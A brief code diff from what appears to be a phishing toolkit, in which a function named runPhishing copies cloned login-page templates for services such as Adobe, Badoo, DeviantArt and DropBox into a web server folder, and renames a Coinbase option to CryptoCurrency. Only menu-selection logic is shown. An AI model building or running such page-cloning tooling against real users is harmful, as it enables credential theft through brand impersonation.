@@ -108,8 +108,8 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree("WebPages/adobe/", "Server/www/")
     elif page == 'Badoo':
         copy_tree("WebPages/badoo/", "Server/www/")
-    elif page == 'Coinbase':
-        copy_tree("WebPages/coinbase/", "Server/www/")
+    elif page == 'CryptoCurrency':
+        copy_tree("WebPages/cryptocurrency/", "Server/www/")
     elif page == 'DevianArt':
         copy_tree("WebPages/devianart/", "Server/www/")
     elif page == 'DropBox':
